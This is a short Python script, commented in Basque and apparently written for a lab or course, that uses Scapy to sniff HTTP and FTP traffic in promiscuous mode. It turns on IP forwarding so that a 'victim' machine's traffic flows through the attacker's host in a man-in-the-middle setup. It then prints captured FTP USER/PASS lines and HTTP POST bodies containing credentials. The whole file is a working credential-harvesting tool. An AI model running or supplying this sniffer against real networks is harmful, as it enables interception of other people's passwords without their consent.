from scapy.all import sniff, IP, TCP, Raw  #Scapy libreriarekin paketeak harrapatzen ditut
import os

os.system("clear")
print("--------------------------------")
print("|     SNIFFER HTTP/FTP         |")
print("--------------------------------")
print()

prot = input("Protokoloa (1=HTTP portua 80, 2=FTP portua 21): ")
interfazea = input("Interfazea (adibidez eth0): ")
muga = input("Zenbat pakete harrapatu? (adib: 100): ")

if prot == "1":
    filtroa = "tcp port 80" #HTTP
elif prot == "2":
    filtroa = "tcp port 21" #FTP
else:
    filtroa = "tcp port 80 or tcp port 21"  #biak nahi badira

#ip_forward aktibatzen dugu paketeak erredirektatu ahal izateko
#hau gabe biktimaren paketeak redpi-ra iritsiko dira baina ez dira aurrera joango
os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")

def pakete_aztertu(p):
    if p.haslayer(Raw) and p.haslayer(IP):  #Raw gabe ez du daturik
        datuak = p[Raw].load.decode("utf-8", errors="ignore")  #errors="ignore" jarri dut bestela karaktere arraroekin petatzen da
        src = p[IP].src
        dst = p[IP].dst

        #biktimaren trafikoa bakarrik erakusten dugu, ez redpi-rena
        if src == "172.16.1.200" or dst == "172.16.1.200":
            return

        if "USER " in datuak or "PASS " in datuak:  #FTP-n pasahitza testu lauan doa, horregatik ikusten dira
            print(f"\nFTP KREDENTZIALAK HARRAPATU: {src} -> {dst}")
            print(f"    {datuak.strip()}")
        elif "POST" in datuak and ("password" in datuak.lower() or "user" in datuak.lower()):  # formulario bat bidaltzen ari da
            print(f"\nHTTP POST KREDENTZIALAK HARRAPATU: {src} -> {dst}")
            print(f"    {datuak[:200]}")
        else:
            print(f"Paketea: {src} -> {dst} ({len(datuak)} byte)")

print(f"\nSniffera aktibatuta ({filtroa})... CTRL+C pulsatu gelditzeko")

try:
    #promisc=True jarri dut beste makinetako trafikoa ikusteko
    #store=False memoria aurrezteko da (irakurri dut oso gomendagarria dela jartzea)
    sniff(iface=interfazea, filter=filtroa, prn=pakete_aztertu,
          count=int(muga), store=False, promisc=True)
except KeyboardInterrupt:
    print("\nGelditu da")
    #ip_forward desaktibatzen dut amaitzean
    os.system("sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")

input("\nPulsatu intro tekla jarraitzeko")
